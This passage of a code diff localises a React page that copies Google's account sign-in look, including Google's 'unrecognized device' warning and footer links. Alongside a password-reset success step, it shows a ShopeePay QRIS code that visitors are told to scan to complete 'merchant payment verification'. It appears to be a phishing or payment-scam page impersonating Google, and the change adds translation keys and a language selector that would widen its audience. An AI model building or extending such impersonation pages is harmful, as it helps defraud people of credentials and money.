             </form>
@@ -920,7 +1027,7 @@ export default function App() {
           {step === 'success' && (
             <div className="flex flex-col flex-grow justify-start">
                <div className="pt-2">
-                 <p className="text-[#444746] text-[14px]">Anda sekarang dapat menggunakan sandi baru Anda untuk login.</p>
+                 <p className="text-[#444746] text-[14px]">{t.successNewPasswordNotice}</p>
                </div>
                <div className="mt-8 flex justify-end items-center pb-6 sm:pb-0">
                 <button
@@ -930,7 +1037,7 @@ export default function App() {
                   className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                   disabled={isLoading}
                 >
-                  Selesai
+                  {t.doneBtn}
                 </button>
               </div>
             </div>
@@ -951,13 +1058,13 @@ export default function App() {
                         <path d="M3 3h8v8H3V3zm2 2v4h4V5H5zm8-2h8v8h-8V3zm2 2v4h4V5h-4zM3 13h8v8H3v-8zm2 2v4h4v-4H5zm13-2h3v3h-3v-3zm-3 3h3v3h-3v-3zm3 3h3v3h-3v-3zm-3-3h-3v3h3v-3zm-3-3h3v3h-3v-3z" />
                       </svg>
                       <span className="text-[12px] text-gray-500 font-medium break-words block">
-                        {import.meta.env.VITE_SHOPEEPAY_API_KEY ? 'QR Code Aktif' : 'API Key Belum Dikonfigurasi'}
+                        {import.meta.env.VITE_SHOPEEPAY_API_KEY ? t.qrCodeActive : t.apiKeyNotConfigured}
                       </span>
                     </div>
                  </div>
 
                  <p className="text-[#1f1f1f] text-center text-[14px] leading-relaxed mb-6">
-                   Pindai QR code ini menggunakan aplikasi <strong>Shopee</strong> atau aplikasi e-wallet lainnya yang mendukung QRIS untuk menyelesaikan verifikasi pembayaran merchant.
+                   {t.qrInstructions}
                  </p>
 
                  <div className="w-full flex justify-end">
@@ -971,7 +1078,7 @@ export default function App() {
                     className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed w-full sm:w-auto"
                     disabled={isLoading}
                   >
-                    Kembali ke Awal
+                    {t.backToStartBtn}
                   </button>
                  </div>
                </div>
@@ -982,10 +1089,10 @@ export default function App() {
             <div className="flex flex-col flex-grow justify-start pt-6">
               <div>
                 <p className="text-[#1f1f1f] text-[16px] leading-[24px]">
-                  Anda mencoba login di perangkat yang tidak dikenali oleh Google, dan kami tidak memiliki cukup informasi untuk memverifikasi ini benar-benar Anda. Untuk perlindungan Anda, Anda tidak dapat login di sini saat ini.
+                  {t.unrecognizedDeviceMsg1}
                 </p>
                 <p className="text-[#1f1f1f] text-[16px] leading-[24px] mt-4">
-                  Coba lagi dari perangkat atau lokasi tempat Anda login sebelumnya. <span className="text-[#0b57d0] cursor-pointer hover:underline font-medium">Pelajari lebih lanjut</span>
+                  {t.unrecognizedDeviceMsg2} <span className="text-[#0b57d0] cursor-pointer hover:underline font-medium">{t.learnMore}</span>
                 </p>
               </div>
             </div>
@@ -999,17 +1106,12 @@ export default function App() {
       {/* Footer */}
       <div className="w-full sm:max-w-[448px] px-6 pb-6 pt-2 sm:px-0 sm:pb-0 sm:pt-6 flex flex-col sm:flex-row justify-between text-[12px] text-[#444746] bg-white sm:bg-transparent">
         <div className="flex justify-start items-center">
-          <div className="flex items-center gap-1 cursor-pointer hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 -ml-2 rounded transition">
-            Indonesia
-            <svg fill="currentColor" viewBox="0 0 24 24" width="16px" height="16px">
-              <path d="M7 10l5 5 5-5z" />
-            </svg>
-          </div>
+          <LanguageSelector lang={lang} setLang={setLang} upward={true} />
         </div>
         <div className="flex gap-4 sm:gap-6 mt-4 sm:mt-0 items-center justify-start sm:justify-end">
-          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 -ml-2 sm:-ml-0 rounded transition">Bantuan</a>
-          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">Privasi</a>
-          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">Persyaratan</a>
+          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 -ml-2 sm:-ml-0 rounded transition">{t.help}</a>
+          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">{t.privacy}</a>
+          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">{t.terms}</a>
         </div>
       </div>
 
